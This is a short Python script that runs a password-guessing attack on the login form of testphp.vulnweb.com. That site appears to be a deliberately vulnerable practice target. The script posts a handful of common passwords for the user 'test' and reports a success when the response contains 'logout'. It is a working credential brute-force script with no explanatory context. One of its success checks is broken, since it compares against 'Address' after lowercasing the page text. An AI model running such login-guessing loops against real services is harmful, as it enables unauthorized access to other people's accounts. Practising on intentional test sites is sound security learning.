import requests

url = "http://testphp.vulnweb.com/login.php"
username = "test"


passwords = ["1234", "password", "admin", "test", "123456"]

for pwd in passwords:
    data = {"uname": username, "pass": pwd}
    r = requests.post(url, data=data)

    print(f"Trying: {pwd}")


    if "logout" in r.text.lower() or "Address" in r.text.lower():
        print(f"✅ Pass: {pwd}")
        break
    else:
        print("❌ No")
